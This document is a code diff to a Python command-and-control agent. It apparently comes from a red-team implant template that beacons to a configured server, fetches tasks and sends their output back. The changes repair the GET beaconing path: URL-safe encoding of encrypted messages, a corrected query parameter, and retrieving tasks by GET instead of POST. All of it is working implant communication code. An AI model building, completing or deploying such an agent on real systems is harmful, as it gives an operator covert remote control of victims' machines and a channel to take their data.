@@ -17,8 +17,10 @@ CRYPTO_HERE
         for k in [ "USER", "LOGNAME", "USERNAME" ]: 
             if k in os.environ.keys(): return os.environ[k]
 
-    def formatMessage(self, data):
-        return base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
+    def formatMessage(self, data, urlsafe=False):
+        output = base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
+        if urlsafe: output = output.replace(b'+',b'%2B').replace(b'/',b"%2F").replace(b'=',b'%3D')
+        return output
 
     def formatResponse(self, data):
         return json.loads(data.replace(self.agent_config["UUID"],""))
@@ -27,7 +29,7 @@ CRYPTO_HERE
         return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data),'POST')))
 
     def getMessageAndRetrieveResponse(self, data):
-        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data))))
+        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data, True))))
 
     def sendTaskOutputUpdate(self, task_id, output):
         responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
@@ -93,7 +95,7 @@ CRYPTO_HERE
 
     def getTaskings(self):
         data = { "action": "get_tasking", "tasking_size": -1 }
-        tasking_data = self.postMessageAndRetrieveResponse(data)
+        tasking_data = self.getMessageAndRetrieveResponse(data)
         for task in tasking_data["tasks"]:
             t = {
                 "task_id":task["id"],
@@ -144,7 +146,7 @@ CRYPTO_HERE
         for header in self.agent_config["Headers"]:
             hdrs[header["name"]] = header["value"]
         if method == 'GET':
-            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetURI"] + "=" + data.decode(), None, hdrs)
+            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetParam"] + "=" + data.decode(), None, hdrs)
         else:
             req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)
         #CERTSKIP
@@ -168,7 +170,7 @@ CRYPTO_HERE
             with urllib.request.urlopen(req) as response:
                 out = base64.b64decode(response.read())
                 response.close()
-                return out.decode() if method == 'GET' else out 
+                return out
         except: return ""
 
     def passedKilldate(self):
